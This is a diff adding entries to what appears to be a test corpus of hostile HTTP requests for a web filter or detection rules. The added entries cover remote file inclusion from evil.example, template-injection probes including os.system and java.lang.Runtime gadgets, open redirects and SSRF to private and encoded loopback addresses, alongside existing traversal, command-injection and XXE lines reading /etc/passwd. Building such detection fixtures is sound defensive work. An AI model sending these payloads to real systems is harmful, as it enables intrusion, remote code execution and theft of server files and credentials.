@@ -217,6 +217,65 @@ GET /download?name=..%2f..%2f..%2fetc%2fpasswd
 GET /?f=../../../../../../etc/passwd
 GET /?file=test.txt%00
 
+# --- Remote file inclusion ---
+# Include-style parameters whose value is a remote URL, protocol-relative, or
+# UNC host. Any remote include is treated as hostile; per-host allowlisting
+# cannot be expressed as a request pattern.
+GET /index.php?page=http://evil.example/shell.txt
+GET /index.php?page=https%3A%2F%2Fevil.example%2Frce.php
+GET /index.php?page=https://evil.example/shell.txt
+GET /index.php?page=smb://evil.example/share/x.php
+GET /view?template=ftp://evil.example/x.tpl
+GET /view?template=//evil.example/x.tpl
+GET /index.php?include=//evil.example/backdoor.php
+GET /index.php?file=%5C%5Cevil.example%5Cshare%5Cx.php
+GET /load?module=http://evil.example/mod.php
+GET /index.php?require=gopher://evil.example/x
+POST /index.php body="page=http://evil.example/shell.txt"
+POST /api/wrapper header="Content-Type: application/json" body="{\"template\":\"http://evil.example/rce.tpl\"}"
+
+# --- Server-side template injection ---
+# Arithmetic probes and engine gadgets inside the delimiters of the common
+# engines (Jinja/Twig, Freemarker, Velocity, ERB/JSP, OGNL, Smarty).
+GET /render?name=%7B%7B7*7%7D%7D
+GET /render?name=%7B%7B7*%277%27%7D%7D
+GET /render?name=%7B%7B7%2B7%7D%7D
+GET /render?name=%7B7*7%7D
+GET /render?name=%24%7B7*7%7D
+GET /render?name=%23%7B7*7%7D
+GET /render?name=%2A%7B7*7%7D
+GET /render?name=%25%7B7*7%7D
+GET /render?name=%40%287*7%29
+GET /render?tpl=%7B%7Bconfig%7D%7D
+GET /render?tpl=%7B%7Bself.__class__%7D%7D
+GET /render?tpl=%7B%7B%27%27.__class__.__mro__%7D%7D
+GET /render?tpl=%7B%7Bcycler.__init__.__globals__%7D%7D
+GET /render?tpl=%7B%7Brequest.application.__globals__%7D%7D
+GET /render?tpl=%7B%7Blipsum.__globals__%7D%7D
+GET /render?tpl=%24%7B__import__%28%27os%27%29.system%28%27id%27%29%7D
+GET /render?tpl=%24%7BT%28java.lang.Runtime%29%7D
+POST /render body="name={{7*7}}"
+POST /render body="name=<%= 7*7 %>"
+POST /render body="<#assign ex=\"java.lang.Runtime\"?new()>"
+POST /render body="tpl=$class.inspect(\"java.lang.Runtime\").type"
+POST /render header="Content-Type: application/json" body="{\"template\":\"{{7*7}}\"}"
+
+# --- Open redirect ---
+# Redirect-style parameters carrying absolute or protocol-relative URLs.
+GET /login?next=http://evil.example/
+GET /login?next=https%3A%2F%2Fevil.example%2Flogin
+GET /logout?redirect=https://evil.example/phish
+GET /auth?redirect_to=//evil.example/
+GET /sso?return_to=http://evil.example
+GET /go?goto=//evil.example
+GET /out?dest=https://evil.example/
+GET /out?destination=%2F%2Fevil.example%2Fpromo
+GET /r?continue=http://evil.example/
+GET /link?target_url=https://evil.example/
+GET /api/hop?out_url=//evil.example/
+POST /login body="next=http://evil.example/&user=tanaka"
+POST /api/redirect header="Content-Type: application/json" body="{\"next\":\"https://evil.example/\"}"
+
 # --- Command injection ---
 GET /?cmd=;cat%20/etc/passwd
 GET /?cmd=|id
@@ -310,6 +369,34 @@ GET /?fetch=gopher://localhost:25/_HELO
 POST /webhook body="url=http://169.254.169.254/latest/meta-data/"
 POST /webhook body="url=http://localhost:9000/actuator/env"
 POST /proxy body="target=http://127.0.0.1:5432"
+# Private, link-local, CGNAT, encoded and shorthand loopback, IPv6
+# equivalents, and protocol-relative values.
+GET /?url=http://10.0.0.1/
+GET /?url=http://10.255.255.254:8080/admin
+GET /?url=http://172.16.0.1/
+GET /?url=http://172.31.255.254/
+GET /?url=http://192.168.0.1/
+GET /?url=http://192.168.255.254/router
+GET /?url=http://169.254.1.1/
+GET /?url=http://100.64.0.1/
+GET /?url=http://100.127.255.254/
+GET /?url=http://127.1/
+GET /?url=http://2130706433/
+GET /?url=http://0x7f000001/
+GET /?url=http://0177.0.0.1/
+GET /?url=http://[::ffff:127.0.0.1]/
+GET /?url=http://[::ffff:7f00:1]/
+GET /?url=http://[fc00::1]/
+GET /?url=http://[fe80::1]/
+GET /?url=//10.0.0.1/
+GET /?url=//192.168.1.1:8080/
+GET /?url=sftp://192.168.1.10/
+GET /?url=tftp://10.0.0.2/
+GET /?url=ldap://10.0.0.3/
+GET /?next=//172.16.9.9/
+POST /api/fetch header="Content-Type: application/json" body="{\"url\":\"http://10.0.0.1/\"}"
+POST /fetch body="url=http://172.20.0.5/"
+POST /fetch body="target=//10.1.2.3/"
 
 # --- XXE ---
 POST /xml body="<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
